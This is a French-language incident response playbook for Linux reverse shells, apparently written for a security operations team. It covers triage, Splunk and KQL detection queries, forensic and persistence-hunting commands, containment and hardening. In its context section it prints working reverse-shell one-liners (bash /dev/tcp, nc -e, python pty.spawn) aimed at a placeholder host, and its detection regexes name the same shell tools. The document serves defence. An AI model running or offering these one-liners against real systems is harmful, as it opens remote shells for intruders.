# Incident Response Playbook — Linux Reverse Shell

| Champ | Valeur |
|-------|--------|
| **Règle associée** | `linux_reverse_shell.yml` |
| **MITRE ATT&CK** | T1059.004 — Unix Shell |
| **Tactique** | Execution / Command and Control |
| **Sévérité** | High |
| **SLA Triage (N1)** | 10 min |
| **SLA Containment (N2/N3)** | 30 min |

---

## 1. Contexte

Un reverse shell est l'une des primitives post-exploitation les plus courantes sur Linux : exploitation d'une vulnérabilité web (Log4Shell, RCE PHP, désérialisation Java), credential reuse SSH, ou pivot interne. La machine victime initie la connexion sortante vers l'attaquant — contournant les firewalls inbound.

**Patterns LOL (Living Off the Land)** :

```bash
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
nc -e /bin/sh 10.0.0.1 4444
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.0.0.1",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/sh")'
perl -e 'use Socket;...'
```

---

## 2. Triage initial (N1 — 0 à 10 min)

### 2.1 Vérifications immédiates

- [ ] **Hôte** : serveur web, base de données, jump host, conteneur ?
- [ ] **Utilisateur** déclencheur : compte applicatif (`www-data`, `apache`, `tomcat`) → exploitation web probable.
- [ ] **Parent** : `httpd`, `nginx`, `php-fpm`, `java` → RCE web confirmée.
- [ ] **IP de destination** dans la commande : externe ? réputation CTI ?

### 2.2 Requêtes de pivot

**Splunk SPL (auditd parsé) :**

```spl
index=linux sourcetype=linux_audit type=EXECVE host=$host$ earliest=-1h
| where match(proctitle, "(?i)(/dev/tcp|/dev/udp|nc -e|ncat -e|pty\\.spawn|dup2)")
| stats count values(proctitle) values(uid) by host, _time
```

**Sentinel KQL :**

```kql
DeviceProcessEvents
| where DeviceName == "$host$"
| where ProcessCommandLine matches regex @"(?i)(/dev/(tcp|udp)|nc\s+-e|ncat\s+-e|pty\.spawn|dup2|socket\.AF_INET)"
| project Timestamp, AccountName, FileName, ProcessCommandLine,
          InitiatingProcessFileName, InitiatingProcessCommandLine
```

### 2.3 Critères d'escalade

- Parent = process **web** (`apache`, `nginx`, `php-fpm`, `tomcat`, `node`) → P0 — RCE confirmée.
- Connexion sortante établie (vérifier `ss -tnp`, EDR netflow) → P0.
- IP externe sur port atypique (4444, 8080, 443) → P0.
- Asset = serveur exposé Internet → P0.

---

## 3. Investigation N2/N3

### 3.1 Reconstitution de la chaîne

```bash
ausearch -i -ts recent --start today
ausearch -i -k execve | tail -200
last -F | head -50
who -a
ss -tnp
journalctl --since "1 hour ago" | grep -E "(audit|sshd|sudo)"
```

### 3.2 Identification du vecteur initial

- **Logs web** (`/var/log/apache2/access.log`, `nginx/access.log`) : POST suspects, payloads dans User-Agent ou Referer, exploitation de CVE connue.
- **Webshell** déposé : `find /var/www -name "*.php" -newer /tmp/marker -mmin -1440`.
- **SSH** : `journalctl -u ssh --since "1 hour ago"`.

### 3.3 Analyse du processus malveillant

```bash
ls -la /proc/<PID>/exe
cat /proc/<PID>/cmdline | tr '\0' ' '
cat /proc/<PID>/environ | tr '\0' '\n'
lsof -p <PID>
gcore <PID>
```

### 3.4 Recherche de persistance

```bash
crontab -l
cat /etc/cron* /var/spool/cron/* 2>/dev/null
systemctl list-units --type=service --state=running
ls -la ~/.ssh/authorized_keys /root/.ssh/authorized_keys
grep -r "@reboot" /etc/cron* /var/spool/cron/ 2>/dev/null
ls -la /etc/init.d/ /etc/systemd/system/
auditctl -l
find / -newer /tmp/marker -type f 2>/dev/null | head -50
```

---

## 4. Containment (< 30 min)

| # | Action | Commande |
|---|--------|----------|
| 1 | Isoler l'asset (firewall) | `iptables -A OUTPUT -j DROP` (puis whitelist mgmt) |
| 2 | Tuer le process | `kill -9 <PID>` |
| 3 | Bloquer l'IP attaquant | Firewall périmétrique + EDR |
| 4 | Bloquer l'utilisateur applicatif si compromis | `usermod -L www-data` |
| 5 | Snapshot disque + RAM avant nettoyage | `lime` / `avml` + `dd` |
| 6 | Désactiver les capabilities suspectes | `getcap -r / 2>/dev/null` |

---

## 5. Eradication & Recovery

1. **Eradication**
   - Suppression du webshell, des binaires droppés, des cron, des keys SSH ajoutées.
   - Audit des comptes locaux (`/etc/passwd`, `/etc/shadow`) — recherche de comptes UID=0 récents.
   - Patch de la vulnérabilité initiale (mise à jour CVE).
2. **Recovery**
   - Re-imagerie depuis baseline si la chaîne d'infection n'est pas tracée intégralement.
   - Rotation **systématique** des secrets de l'application (DB password, API keys, JWT secrets).
   - Validation : scan EDR + Lynis + Trivy.
3. **Hardening post-incident**
   - SELinux / AppArmor en mode **enforcing** sur les services critiques.
   - **Falco** ou **auditd** rules pour `execve` shells inhabituels.
   - **WAF** (ModSecurity / Cloud WAF) en bloquage actif.
   - **Egress filtering** : bloquer toute connexion sortante depuis serveurs web sauf whitelist.
   - **CIS Benchmark** Linux appliqué.

---

## 6. Communication & RETEX

- Si données ou code source impactés : RSSI + DSI + juridique.
- Si exposition Internet : penser exposition CTI (peut-être déjà scanné par d'autres adversaires).
- Mesurer le **dwell time** entre 1ère exploitation et détection.
- Vérifier la couverture **Falco / auditd** : la règle aurait-elle pu déclencher plus tôt ?

---

## 7. Références

- ATT&CK T1059.004 : <https://attack.mitre.org/techniques/T1059/004/>
- PayloadsAllTheThings — Reverse Shells : <https://github.com/swisskyrepo/PayloadsAllTheThings>
- GTFOBins : <https://gtfobins.github.io/>
- Falco rules : <https://github.com/falcosecurity/falco/blob/master/rules/falco_rules.yaml>
- Atomic Test T1059.004 : <https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1059.004>
